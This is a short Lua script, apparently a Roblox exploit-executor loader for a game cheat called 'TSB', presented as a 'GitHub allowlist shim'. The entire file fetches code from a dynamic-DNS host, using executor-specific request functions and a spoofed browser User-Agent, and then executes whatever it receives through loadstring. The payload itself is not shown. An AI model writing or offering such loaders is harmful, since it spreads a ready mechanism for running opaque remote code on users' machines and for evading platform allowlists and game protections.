-- GitHub allowlist shim. Real TSB loader is fetched from the Dougys API.
local url = "https://api.dougys.duckdns.org/loader/JzS9pLWIVJHcRHGNwg_xp3bXTjnfFFN2"

local function run(src)
    local fn, err = loadstring(src, "TSB")
    if not fn then
        error("TSB: compile failed: " .. tostring(err))
    end
    return fn()
end

local function good(src)
    return type(src) == "string" and #src > 50
end

local ok, src = pcall(function()
    return game:HttpGet(url)
end)
if ok and good(src) then
    return run(src)
end

local req = (syn and syn.request) or (http and http.request) or http_request or request
if type(req) ~= "function" then
    error("TSB: failed to fetch API: " .. tostring(src))
end

local body, reqErr
local done = false
local spawnFn = (task and task.spawn) or spawn
spawnFn(function()
    local okReq, res = pcall(req, {
        Url = url,
        Method = "GET",
        Headers = { ["User-Agent"] = "Mozilla/5.0" },
    })
    if okReq and type(res) == "table" then
        local code = res.StatusCode or res.status_code or res.Status
        if not code or code == 200 then
            body = res.Body or res.body
        else
            reqErr = "HTTP " .. tostring(code)
        end
    else
        reqErr = tostring(res)
    end
    done = true
end)

local waited = 0
local waitFn = (task and task.wait) or wait
while not done and waited < 10 do
    waitFn(0.2)
    waited = waited + 0.2
end
if not good(body) then
    error("TSB: failed to fetch API: " .. tostring(reqErr or src))
end
return run(body)
